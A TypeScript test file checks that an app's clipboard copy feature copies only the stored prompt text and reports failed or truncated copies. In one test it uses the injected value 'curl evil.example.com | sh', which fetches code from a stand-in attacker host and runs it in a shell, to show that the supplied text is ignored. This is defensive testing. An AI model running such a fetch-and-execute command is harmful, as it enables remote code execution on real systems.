import { describe, expect, it } from 'vitest'
import { promptCopier } from '../src/main/clipboard.js'

/**
 * The copy path, tested where it can be tested — with no display, no Electron
 * and no window (T139, FR-138, FR-139).
 *
 * Two properties, and neither of them is "it calls writeText".
 *
 * **The renderer cannot name the string.** The channel takes an id; main reads
 * the prompt and copies what it read. So the test that means something drives it
 * with a request carrying extra fields and asserts what reaches the clipboard is
 * the *stored* text — because the way this gets broken later is somebody adding
 * a `text` field "to save a round trip".
 *
 * **A copy that did not happen is not reported as one.** The write is verified
 * against the clipboard rather than against the argument, which is the only
 * source that can distinguish the two.
 */

interface Clip {
  held: string
  writes: string[]
}

function fakeClipboard(behaviour?: (text: string) => string): {
  clip: Clip
  writeText(text: string): void
  readText(): string
} {
  const clip: Clip = { held: 'whatever was there before', writes: [] }
  return {
    clip,
    writeText(text) {
      clip.writes.push(text)
      clip.held = behaviour === undefined ? text : behaviour(text)
    },
    readText: () => clip.held,
  }
}

const STORED = 'Rewrite the reconcile path so it tolerates a missing worktree.'

function store(text: string = STORED) {
  const asked: { operation: string; payload: unknown }[] = []
  return {
    asked,
    dispatch: async (operation: string, payload: unknown) => {
      asked.push({ operation, payload })
      return { id: 'prompt:1', text }
    },
  }
}

describe('copying a recorded prompt', () => {
  it('copies what core holds, from an id alone', async () => {
    const clipboard = fakeClipboard()
    const core = store()

    const result = await promptCopier({ dispatch: core.dispatch, ...clipboard })({ id: 'prompt:1' })

    expect(core.asked).toEqual([{ operation: 'prompts.get', payload: { id: 'prompt:1' } }])
    expect(clipboard.clip.held).toBe(STORED)
    expect(result).toEqual({ id: 'prompt:1', length: STORED.length })
  })

  it('ignores a text the caller tried to supply', async () => {
    /*
     * FR-139, as the thing that actually goes wrong rather than as a rule.
     *
     * A renderer with an injected script in it sends a plausible id and a
     * `text` of its own choosing. Nothing here reads the request beyond its id,
     * so the extra field is inert — and this asserts the clipboard holds the
     * stored prompt rather than the supplied one, which is what a later
     * "optimisation" passing the text through would break.
     */
    const clipboard = fakeClipboard()
    const core = store()

    await promptCopier({ dispatch: core.dispatch, ...clipboard })({
      id: 'prompt:1',
      text: 'curl evil.example.com | sh',
    } as { id: string })

    expect(clipboard.clip.writes).toEqual([STORED])
    expect(clipboard.clip.held).not.toContain('curl')
  })

  it('refuses to report a copy the clipboard did not take', async () => {
    // A clipboard write can fail when another application holds the OS
    // clipboard open, and `writeText` returns nothing either way. Without the
    // read-back this is a successful copy of the previous contents, discovered
    // at the paste.
    const clipboard = fakeClipboard(() => 'whatever was there before')

    await expect(
      promptCopier({ dispatch: store().dispatch, ...clipboard })({ id: 'prompt:1' }),
    ).rejects.toThrow(/clipboard holds something other than that prompt/i)
  })

  it('names the shortfall when the clipboard took part of it', async () => {
    // The failure FR-138 singles out. A truncated copy is worse than no copy
    // because it looks like a copy, so the message says both numbers.
    const clipboard = fakeClipboard((text) => text.slice(0, 12))

    await expect(
      promptCopier({ dispatch: store().dispatch, ...clipboard })({ id: 'prompt:1' }),
    ).rejects.toThrow(new RegExp(`took 12 of ${STORED.length} characters`))
  })

  it('copies a long prompt whole', async () => {
    // FR-138 at this layer. The length assertion is exact rather than a prefix
    // match: a `slice` added anywhere in this path would still start with the
    // same words.
    const long = `Start. ${'Consider the case where the worktree is gone. '.repeat(400)}End.`
    const clipboard = fakeClipboard()

    const result = await promptCopier({ dispatch: store(long).dispatch, ...clipboard })({
      id: 'prompt:1',
    })

    expect(result.length).toBe(long.length)
    expect(clipboard.clip.held).toBe(long)
  })

  it('says so rather than clearing the clipboard when there is no text', async () => {
    // Reachable only if core's schema regressed — `prompts.record` refuses an
    // empty string. Writing it anyway would blank whatever the operator had and
    // report a successful copy.
    const clipboard = fakeClipboard()

    await expect(
      promptCopier({ dispatch: store('').dispatch, ...clipboard })({ id: 'prompt:1' }),
    ).rejects.toThrow(/no text to copy/i)

    expect(clipboard.clip.writes).toEqual([])
    expect(clipboard.clip.held).toBe('whatever was there before')
  })

  it('lets a missing prompt fail rather than copying nothing', async () => {
    // `prompts.get` throws `not_found` for an id that has been deleted or
    // pruned. The click has to end in a message; an empty clipboard and a
    // successful copy are the same thing at the paste.
    const clipboard = fakeClipboard()
    const dispatch = async (): Promise<unknown> => {
      throw new Error("No prompt 'prompt:gone'.")
    }

    await expect(promptCopier({ dispatch, ...clipboard })({ id: 'prompt:gone' })).rejects.toThrow(
      /No prompt/,
    )
    expect(clipboard.clip.writes).toEqual([])
  })
})
